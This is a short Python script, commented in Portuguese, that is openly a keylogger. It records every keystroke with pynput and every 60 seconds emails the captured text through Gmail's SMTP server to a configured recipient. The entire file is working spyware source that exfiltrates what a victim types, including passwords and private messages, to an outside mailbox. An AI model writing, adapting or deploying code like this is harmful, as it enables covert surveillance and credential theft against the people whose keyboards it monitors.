from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# Acumulador dos dados digitados
log = ""

# CONFIGURAÇÕES DE E-MAIL
EMAIL_ORIGEM = ""
EMAIL_DESTINO = ""
SENHA_EMAIL = ""  # Insira aqui a senha de App de 16 dígitos criada na Conta Google

def enviar_email():
    global log
    if log:
        try:
            # Estruturação da mensagem
            msg = MIMEText(log)
            msg['Subject'] = "Dados capturados pelo keylogger"
            msg['From'] = EMAIL_ORIGEM
            msg['To'] = EMAIL_DESTINO

            # Conexão com o servidor SMTP do Gmail
            server = smtplib.SMTP("smtp.gmail.com", 465)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()

            # Limpa o buffer de log após envio bem-sucedido
            log = ""
        except Exception as e:
            print("Erro ao enviar e-mail:", e)

    # Reagenda o envio automático a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        # Captura caracteres normais (letras, números e símbolos)
        if key.char is not None:
            log += key.char
    except AttributeError:
        # Tratamento correto das teclas especiais (espaço, enter, backspace)
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += " [<] "
        else:
            # Ignora teclas de controle como Shift, Ctrl, Alt, etc.
            pass

# --- INICIALIZAÇÃO DO PROGRAMA ---

# agenda o primeiro disparo em 60 segundos
Timer(60, enviar_email).start()

# Inicia a escuta contínua de teclas
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()